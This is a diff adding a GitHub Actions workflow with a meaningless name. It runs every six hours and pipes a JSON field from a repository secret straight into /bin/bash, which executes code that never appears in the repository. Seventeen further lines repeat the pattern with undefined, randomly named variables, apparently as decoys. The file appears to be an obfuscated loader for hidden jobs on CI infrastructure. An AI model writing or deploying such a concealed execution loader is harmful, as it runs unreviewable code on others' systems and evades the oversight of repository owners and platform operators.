@@ -1,0 +1,35 @@
+name: meicidouzhemezhi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: meicidouzhemezhi
+        env:
+          sft9009: ${{ secrets.sft9009 }}
+        run: |
+          echo $sft9009 | jq -r .np5 | /bin/bash
+          echo $eoo28488 | jq -r .lv87826 | /bin/bash
+          echo $u6335 | jq -r .xfir65 | /bin/bash
+          echo $crt6427 | jq -r .jr27 | /bin/bash
+          echo $k989 | jq -r .mb09521 | /bin/bash
+          echo $pekny2216 | jq -r .tfu13 | /bin/bash
+          echo $kbeox9137 | jq -r .lz4 | /bin/bash
+          echo $bmo7 | jq -r .vdocq23 | /bin/bash
+          echo $kw3 | jq -r .npfa09 | /bin/bash
+          echo $numtf929 | jq -r .af60 | /bin/bash
+          echo $kp03425 | jq -r .mp82279 | /bin/bash
+          echo $g34 | jq -r .ezify84 | /bin/bash
+          echo $i61922 | jq -r .rev1106 | /bin/bash
+          echo $cv5 | jq -r .ias42602 | /bin/bash
+          echo $llccq075 | jq -r .bly503 | /bin/bash
+          echo $ocvb6198 | jq -r .cgyc9776 | /bin/bash
+          echo $sc21 | jq -r .ihux8 | /bin/bash
+          echo $fu042 | jq -r .tnkz945 | /bin/bash
+
